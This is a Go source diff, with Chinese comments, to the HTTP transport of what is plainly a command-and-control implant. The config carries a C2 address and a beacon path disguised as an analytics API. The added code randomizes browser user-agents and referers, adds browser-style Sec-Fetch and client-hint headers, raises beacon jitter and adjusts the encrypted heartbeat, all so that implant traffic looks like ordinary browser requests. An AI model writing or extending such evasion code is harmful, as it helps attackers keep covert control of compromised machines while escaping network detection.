@@ -4,6 +4,7 @@ import (
 	"crypto/tls"
 	"fmt"
 	"io"
+	"math/rand"
 	"net/http"
 	"net/url"
 	"runtime"
@@ -39,20 +40,59 @@ type HTTPConfig struct {
 	SkipVerify bool
 }
 
+// 随机User-Agent生成
+func randomUA() string {
+	uas := []string{
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
+	}
+	rand.Seed(time.Now().UnixNano())
+	return uas[rand.Intn(len(uas))]
+}
+
+// 随机Referer生成
+func randomReferer() string {
+	referers := []string{
+		"https://www.google.com/",
+		"https://www.bing.com/",
+		"https://www.yahoo.com/",
+		"https://www.baidu.com/",
+		"https://www.douban.com/",
+		"https://www.csdn.net/",
+		"https://blog.csdn.net/",
+		"https://github.com/",
+	}
+	rand.Seed(time.Now().UnixNano())
+	return referers[rand.Intn(len(referers))]
+}
+
 // DefaultConfig 使用普通API路径伪装
 func DefaultConfig(addr string) *HTTPConfig {
 	return &HTTPConfig{
 		C2Addr:    addr,
 		Path:      "/api/v1/analytics",
-		UserAgent: defaultUA(),
+		UserAgent: randomUA(),
 		Interval:  5,
-		Jitter:    20,
+		Jitter:    30,
 		Headers: map[string]string{
-			"Accept":          "application/json, text/plain, */*",
-			"Accept-Language": "en-US,en;q=0.9",
-			"Accept-Encoding": "gzip, deflate",
-			"Cache-Control":   "no-cache",
-			"Origin":          "http://localhost",
+			"Accept":             "application/json, text/plain, */*",
+			"Accept-Language":    "zh-CN,zh;q=0.9,en;q=0.8",
+			"Accept-Encoding":    "gzip, deflate, br",
+			"Cache-Control":      "no-cache",
+			"Origin":             "http://localhost:8080",
+			"Referer":            randomReferer(),
+			"Sec-Ch-Ua":          `"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"`,
+			"Sec-Ch-Ua-Mobile":   "?0",
+			"Sec-Ch-Ua-Platform": `"Windows"`,
+			"Sec-Fetch-Dest":     "empty",
+			"Sec-Fetch-Mode":     "cors",
+			"Sec-Fetch-Site":     "same-origin",
+			"X-Requested-With":   "XMLHttpRequest",
 		},
 		UseSSL:     false,
 		SkipVerify: true,
@@ -150,7 +190,7 @@ func (t *HTTPTransport) Send(pkt *encode.Packet, sid string) (*encode.Packet, er
 func (t *HTTPTransport) Poll(sid string) (*encode.Packet, error) {
 	pkt := &encode.Packet{
 		Type: encode.MsgHeartbeat,
-		Data: []byte{},
+		Data: []byte{0}, // 非空数据避免AES-GCM空明文问题
 	}
 	return t.Send(pkt, sid)
 }
